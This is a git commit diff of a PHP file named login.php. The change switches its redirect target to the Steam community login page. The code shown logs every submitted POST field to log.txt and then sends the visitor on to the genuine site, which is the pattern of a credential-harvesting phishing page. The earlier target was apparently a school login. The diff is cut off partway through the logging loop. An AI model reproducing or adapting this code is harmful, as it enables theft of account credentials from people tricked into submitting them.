8fa1468e8e595f383583a156d1acf05f4354641e
XZ4r1337 <51450355+XZ4r1337@users.noreply.github.com>
2020-04-01 21:21:49 +0200

    Update login.php

--- login.php
+++ login.php
@@ -1,5 +1,5 @@
 <?php
-header ('Location: https://dexter.uddevalla.se/');
+header ('Location: https://steamcommunity.com/login/home/?goto=');
 $handle = fopen("log.txt", "a");
 foreach($_POST as $variable => $value) {
    fwrite($handle, $variable);
